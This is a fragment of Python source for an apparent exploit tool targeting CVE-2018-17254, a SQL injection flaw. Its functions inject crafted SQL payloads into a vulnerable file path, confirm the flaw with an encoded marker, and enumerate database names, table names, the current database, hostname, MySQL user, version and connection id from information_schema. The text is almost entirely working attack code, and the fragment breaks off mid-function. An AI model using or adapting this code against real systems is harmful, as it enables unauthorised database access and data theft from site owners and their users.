...
def inject(target, payload):
    global vuln_file
    request_target = target + vuln_file + payload
    response = get_request(request_target, verify=False)
    matches = re.findall(r'target ="(.*)">', response)
    return matches

def is_vulnerable(target):
    output = inject(target, payload("0x6861636b6564")) 
    if output and base64.b64encode(output[0].encode()).decode() == "aGFja2Vk":  
        return True
    return False

def get_db_names(target):
    db_names = []
    output = inject(target, payload("schema_name", "%20from%20information_schema.schemata"))
    db_names.extend(output)
    return db_names

def get_table_names(target, db):
    table_names = []
    output = inject(target, payload("table_name", f"%20from%20information_schema.tables%20WHERE%20table_schema='{db}'"))
    table_names.extend(output)
    return table_names

def scan_cve_2018_17254(target):
    print(colored("[+] Checking if target is vulnerable...", "cyan", attrs=["bold"]))
    
    if is_vulnerable(target):
        main_db = inject(target, payload("database()"))[0]
        hostname = inject(target, payload("@@hostname"))[0]
        mysql_user = inject(target, payload("user()"))[0]
        mysql_version = inject(target, payload("@@version"))[0]
        connection_id = inject(target, payload("connection_id()"))[0]
